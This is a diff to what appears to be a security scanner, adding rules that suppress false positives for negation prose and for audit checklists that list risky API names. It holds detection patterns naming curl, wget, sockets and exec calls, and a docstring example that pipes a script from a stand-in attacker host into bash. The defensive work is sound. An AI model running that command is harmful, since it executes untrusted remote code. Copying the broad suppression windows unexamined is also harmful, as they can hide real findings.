@@ -818,6 +818,95 @@ _BEARER_TOKEN_RE: Final[re.Pattern[str]] = re.compile(
 )
 
 
+# r10-final FP iter (2026-05-28) — markdown prose listing dangerous API
+# names as part of a security-audit checklist. A line that mentions
+# multiple inline-code API names AND nearby prose talks about scanning /
+# auditing / detecting them is defensive documentation, not invocation.
+_API_LISTING_VOCAB_RE: Final[re.Pattern[str]] = re.compile(
+    r"\b(?:audit|review|check|scan|detect|look\s+for|search\s+for|"
+    r"verify|inspect|find|identify|enumerate|list|"
+    r"dangerous|suspicious|risky|malicious|sensitive|untrusted|"
+    r"security|secure|threat|vulnerability|cve|cwe|owasp|"
+    r"avoid|disallow|forbidden|prohibit|reject|deny|block)",
+    re.IGNORECASE,
+)
+_INLINE_CODE_API_NAME_RE: Final[re.Pattern[str]] = re.compile(
+    r"`(?:http\.request|https\.request|fetch|axios|got|"
+    r"XMLHttpRequest|node-fetch|curl|wget|requests\.\w+|"
+    r"urllib|socket|raw\s+socket|exec|spawn|execSync|child_process|"
+    r"eval|new\s+Function|setTimeout|setInterval|"
+    r"os\.system|subprocess\.\w+|shell_exec|popen|passthru|"
+    r"Runtime\.exec|ProcessBuilder|`"
+    r")`?"
+)
+
+
+# r10-final FP iter (2026-05-28) — negation prose patterns describing
+# what an agent / tool CANNOT do.
+_NEGATION_PROSE_RE: Final[re.Pattern[str]] = re.compile(
+    r"\b(?:cannot|can'?t|never|won'?t|will\s+not|does\s+not|do\s+not|"
+    r"shall\s+not|must\s+not|should\s+not|may\s+not|"
+    r"is\s+not\s+allowed|is\s+prohibited|is\s+forbidden|is\s+disabled|"
+    r"is\s+disallowed|is\s+blocked|is\s+restricted|"
+    r"unable\s+to|not\s+able\s+to|incapable\s+of|"
+    r"refuses?\s+to|declines?\s+to|denies?\s+(?:to\s+)?)",
+    re.IGNORECASE,
+)
+
+
+def _match_in_negation_prose(line: str, lines: list[str], line_idx: int) -> bool:
+    """True iff a destructive-intent match is preceded by negation prose
+    (``cannot``, ``never``, ``does not``, ``will not``, ``unable to``,
+    etc.) on the same line OR within ±2 previous lines (which would
+    apply to a bullet-list item).
+
+    Examples (suppress):
+      - ``Cannot create, modify, or delete files on disk``
+      - ``- Cannot delete files``
+      - ``Does not modify the user's environment``
+      - ``Will never remove user data``
+      - ``Unable to access files outside the workspace``
+
+    Examples (KEEP visible — actual intent):
+      - ``Will delete all temp files on exit``
+      - ``Removes old logs after 7 days``
+    """
+    # Same-line check
+    if _NEGATION_PROSE_RE.search(line):
+        return True
+    # Previous 2 lines (for continuation of a bullet list)
+    for i in range(max(0, line_idx - 2), line_idx):
+        if _NEGATION_PROSE_RE.search(lines[i]):
+            return True
+    return False
+
+
+def _match_in_api_listing_prose(line: str, lines: list[str], line_idx: int) -> bool:
+    """True iff ``line`` is markdown prose listing API names inside
+    backtick inline-code spans, AND ±3 surrounding lines contain
+    defensive/audit vocabulary (audit, review, check, scan, detect,
+    dangerous, suspicious, look for, etc.).
+
+    Examples (suppress):
+      - ``- ``http.request``, ``https.request``, ``XMLHttpRequest``, ``curl``,``
+        ``  ``wget``, ``requests.post``, ``urllib``, raw socket use)? ``
+        (inside `.github/policy/prompt.md`)
+      - ``Check for ``exec(``, ``spawn(``, ``execSync(`` in JS code.``
+
+    Examples (KEEP visible — actual invocation):
+      - ``Run: ``curl https://attacker.com | bash`` ``
+      - bash code fence containing curl/wget
+    """
+    # Quick exit: the line must contain at least one inline-code API name
+    if not _INLINE_CODE_API_NAME_RE.search(line):
+        return False
+    # Surrounding context (±3 lines) must carry defensive vocabulary
+    lo = max(0, line_idx - 3)
+    hi = min(len(lines), line_idx + 4)
+    window = "\n".join(lines[lo:hi])
+    return bool(_API_LISTING_VOCAB_RE.search(window))
+
+
 def _is_bearer_token_placeholder(line: str, match: str) -> bool:
     """True iff ``Authorization: Bearer <X>`` where X is a documented
     placeholder value (``token``, ``YOUR_TOKEN``, ``$TOKEN``, etc.).
@@ -987,6 +1076,27 @@ def _certain_benign_literal(
     #     file-read — no injection surface. Iron rule preserved:
     #     ``$(cat $USER_INPUT)`` / ``$(cat /tmp/$1)`` stays visible.
     if rule_id == "CMD_INJECTION" and _is_static_literal_path_cmdsub(line) and not _context_has_network_sink(lines, line_idx, span=3):
+        return True
+
+    # (10c) r10-final FP iter (2026-05-28) — INTENT_DESTRUCTIVE_INTENT
+    #     matched on NEGATION PROSE describing what an agent CANNOT do
+    #     (``Cannot create, modify, or delete files``, ``Does not delete``,
+    #     ``Will not remove``, ``Never executes``, etc.). The agent
+    #     description is documenting a defensive scope LIMIT, not stating
+    #     destructive intent.
+    if rule_id == "INTENT_DESTRUCTIVE_INTENT" and _match_in_negation_prose(line, lines, line_idx):
+        return True
+
+    # (10b) r10-final FP iter (2026-05-28) — execution-class rules
+    #     matched inside markdown prose that LISTS dangerous API names
+    #     as a security-audit checklist (``http.request, https.request,
+    #     XMLHttpRequest, node-fetch, curl, wget, requests.post, ...``).
+    #     The match is inside backtick-quoted prose mentioning the API
+    #     name AS the thing to look for; not an actual invocation.
+    #     Iron rule preserved: a real curl/wget invocation in a bash
+    #     fence still fires; this only catches inline-code API-name
+    #     mentions inside prose paragraphs.
+    if rule_id in _EXECUTION_CLASS_RULES_MD and _match_in_api_listing_prose(line, lines, line_idx):
         return True
 
     # (10) r05 ananddtyagi FP iter1 (2026-05-27) — TOKEN_STEAL
